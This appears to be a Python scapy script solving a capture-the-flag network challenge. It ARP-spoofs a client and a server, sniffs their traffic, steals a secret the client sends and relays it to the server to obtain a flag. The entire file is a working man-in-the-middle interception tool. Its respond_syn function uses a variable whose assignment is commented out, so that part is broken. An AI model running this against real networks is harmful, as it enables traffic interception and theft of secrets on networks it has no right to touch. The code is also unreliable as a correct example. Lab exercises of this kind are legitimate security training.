from scapy.all import *
import sys

FLAG = "flag"
IP = "10.0.0.1"
IP_CLIENT = "10.0.0.2"
IP_SERVER = "10.0.0.3"
IS_AT = 2
PORT = 31337

class   Mitm_Agent:
    def __init__(self, ip_client=IP_CLIENT, ip_server=IP_SERVER):
        self.cmds = ["secret: ", "command: ", "Hello, World!", "echo"]
        self.ip_client = ip_client
        self.ip_server = ip_server
        self.mac = get_if_hwaddr(conf.iface)
        self.secret = None
    
    def spoof_arp(self, ip_to_spoof, ip_dst):
        frame = Ether(dst=getmacbyip(ip_dst), src=self.mac)
        packet_ = frame / ARP(psrc=ip_to_spoof, hwsrc=self.mac, op=IS_AT, pdst=ip_dst)
        sendp(packet_)
    
    def send_secret_signal(self):
        if  not self.secret:
            return
        
        self.send_data(self.ip_client, self.cmds[0])

    def spoof_attack(self):
        self.spoof_arp(self.ip_server, self.ip_client)
        self.spoof_arp(self.ip_client, self.ip_server)
        self.send_secret_signal()
    
    def send_data(self, ip_dst, data):
        ip_src = self.ip_client
        if ip_dst == self.ip_client:
            ip_src = self.ip_server
        
        frame = Ether(dst=getmacbyip(ip_dst), src=self.mac)
        packet_ = frame / IP(src=ip_src, dst=ip_dst) / TCP(dport=PORT, sport=PORT) / Raw(load=data.encode())
        sendp(packet_)

    def send_response(self, packet, ip_src, data):
        print(f"[+] data = {data}")
        if ip_src == self.ip_client:
            if not self.secret and data not in self.cmds:
                self.secret = data
        else:
            #if not self.secret:
            #    return
            
            if data == self.cmds[0] and self.secret:
                self.send_data(ip_src, self.secret)
                return
            
            if data == self.cmds[1]:
                print("ato------------------------------")
                self.send_data(ip_src, FLAG)
                return
            
            if data not in self.cmds:
                print(data)
                sys.exit(0)

    def handle_comm(self, packet):
        packet.show()
        self.send_secret_signal()

        if ARP in packet:
            if packet[ARP].op == 1:  # who-has (request)
                self.spoof_attack()
            return

            
        if TCP not in packet or IP not in packet:
            return

        if respond_syn(packet):
            return
        
        if  Raw not in packet:
            return
        
        ip = packet[IP]
        data = packet[Raw].load.decode("utf-8")
        self.send_response(packet, ip.src, data)
        return 
        
    def run(self):
        self.spoof_attack()
        sniff(store=False, count=-1, prn=self.handle_comm)

def respond_syn(packet):
    if TCP not in packet or packet[TCP].flags != "S":
        return (False)

    ip = packet[IP]
    tcp = packet[TCP]
    # ip_src = IP_CLIENT
    # if ip.src == IP_CLIENT:
    #     ip_src = IP_SERVER
    print(f"[+] Responding to syn from {ip_src}...")
    synack = IP(src=ip.dst, dst=ip.src) / \
             TCP(sport=tcp.dport, dport=tcp.sport,
                 flags="SA",
                 seq=tcp.seq + 1,
                 ack=tcp.seq + 1)
    send(synack)
    return (True)

def main():
    mitm = Mitm_Agent()
    mitm.run()
    return (0)

if __name__ == "__main__":
    main()